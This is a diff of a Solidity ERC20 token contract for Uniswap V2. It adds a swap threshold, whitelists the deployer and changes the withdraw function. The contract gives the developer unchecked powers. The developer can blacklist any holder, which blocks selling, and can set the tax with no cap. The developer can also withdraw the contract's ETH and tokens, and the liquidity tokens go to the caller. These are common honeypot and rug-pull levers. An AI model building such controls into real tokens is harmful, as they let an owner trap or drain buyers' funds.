@@ -24,6 +24,7 @@ contract ERC20_UniV2 {
     uint public _tax;
     uint public _max;
     uint public _transferDelay;
+    uint public _swapAmount;
     address private _v2Router;
     address public _v2Pair;
     address public _dev;
@@ -34,20 +35,17 @@ contract ERC20_UniV2 {
 
     modifier onlyDev() {require(msg.sender == _dev, "Only the developer can call this function");_;}
 
-    constructor(string memory name_, string memory symbol_, uint decimals_, uint supply_, uint tax_, uint max_, uint transferDelay_) payable {
-        _name = name_;
-        _symbol = symbol_;
-        _decimals = decimals_;
-        _dev = msg.sender;
-        _tax = tax_;
-        _max = max_;
+    constructor(string memory name_, string memory symbol_, uint decimals_, uint supply_, uint tax_, uint max_, uint transferDelay_, uint swapAmount_) payable {
+        _name = name_; _symbol = symbol_; _decimals = decimals_;
+        _tax = tax_; _max = max_; _swapAmount = swapAmount_;
+        _totalSupply = supply_ * 10 ** decimals_;
         _balances[address(this)] = supply_ * 10 ** decimals_;
         emit Transfer(address(0), address(this), supply_ * 10 ** decimals_);
-        _totalSupply = supply_ * 10 ** decimals_;
         _v2Router = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
         uniswapV2Router = IUniswapV2Router02(_v2Router);
         _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
         _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();
+        _whitelisted[address(this)] = true; _whitelisted[msg.sender] = true; _dev = msg.sender;
         _transferDelay = transferDelay_;
     }
 
@@ -72,18 +70,13 @@ contract ERC20_UniV2 {
         require(_balances[from] >= amount && (amount + _balances[to] <= maxInt() || _whitelisted[from] || _whitelisted[to] || to == _v2Pair), "ERC20: transfer amount exceeds balance or max wallet");
         require(_blacklisted[from] == false && _blacklisted[to] == false, "ERC20: YOU DON'T HAVE THE RIGHT");
         require(block.number > _lastTransferBlock[from] + _transferDelay || from == _v2Pair, "ERC20: transfer delay not met");
-        if ((from == _v2Pair || to == _v2Pair) && !_whitelisted[from] && !_whitelisted[to] && tx.origin != _dev && from != address(this)) {
+        if ((from == _v2Pair || to == _v2Pair) && !_whitelisted[from] && !_whitelisted[to]) {
             uint256 taxAmount = amount * _tax / 100;
-            amount -= taxAmount;
-            _balances[address(this)] += taxAmount;
-            emit Transfer(from, address(this), taxAmount);
-            if (_balances[address(this)] > amount && to == _v2Pair) {_swapBack(_balances[address(this)]);}
+            amount -= taxAmount; _balances[address(this)] += taxAmount; emit Transfer(from, address(this), taxAmount);
+            if (_balances[address(this)] > _swapAmount && to == _v2Pair) {_swapBack(_balances[address(this)]);}
         }
-        _lastTransferBlock[from] = block.number;
-        _lastTransferBlock[to] = block.number;
-        _balances[from] -= amount;
-        _balances[to] += amount;
-        emit Transfer(from, to, amount);
+        _lastTransferBlock[from] = block.number; _lastTransferBlock[to] = block.number;
+        _balances[from] -= amount; _balances[to] += amount; emit Transfer(from, to, amount);
     }
 
     function _approve(address owner, address spender, uint256 amount) internal {
@@ -97,28 +90,28 @@ contract ERC20_UniV2 {
         _approve(owner, spender, currentAllowance - amount);
     }
 
-    function _setDev (address dev_) external onlyDev {_dev = dev_;}
-
-    function _setTax (uint8 tax_) external onlyDev {_tax = tax_;}
-
-    function setMax(uint max_) external onlyDev {_max = max_;}
-
-    function updateWhitelist(address[] memory addresses, bool whitelisted_) public onlyDev {
+    function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {
         for (uint i = 0; i < addresses.length; i++) {
             _whitelisted[addresses[i]] = whitelisted_;
         }
     }
 
-    function updateBlacklist(address[] memory addresses, bool blacklisted_) public onlyDev {
+    function updateBlacklist(address[] memory addresses, bool blacklisted_) external onlyDev {
         require(msg.sender == _dev || _blackguard[msg.sender], "Only the developer or night's watch can call this function");
         for (uint i = 0; i < addresses.length; i++) {_blacklisted[addresses[i]] = blacklisted_; _blacklistArray.push(addresses[i]);}
     }
 
-    function updateBlackguard(address[] memory addresses, bool blackguard_) public onlyDev {
+    function updateBlackguard(address[] memory addresses, bool blackguard_) external onlyDev {
         for (uint i = 0; i < addresses.length; i++) {
             _blackguard[addresses[i]] = blackguard_;
         }
     }
+
+    function setDev (address dev_) external onlyDev {_dev = dev_;}
+
+    function setTax (uint8 tax_) external onlyDev {_tax = tax_;}
+
+    function setMax(uint max_) external onlyDev {_max = max_;}
 
     function setTransferDelay(uint delay) external onlyDev {_transferDelay = delay;}
 
@@ -134,9 +127,9 @@ contract ERC20_UniV2 {
         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), _balances[address(this)], 0, 0, msg.sender, block.timestamp);
     }
 
-    function withdraw() external onlyDev {
+    function withdraw(uint amount_) external onlyDev {
         payable(_dev).transfer(address(this).balance);
-        _transfer(address(this), _dev, _balances[address(this)]);
+        _transfer(address(this), _dev, amount_);
     }
 
     function deposit() external payable {}
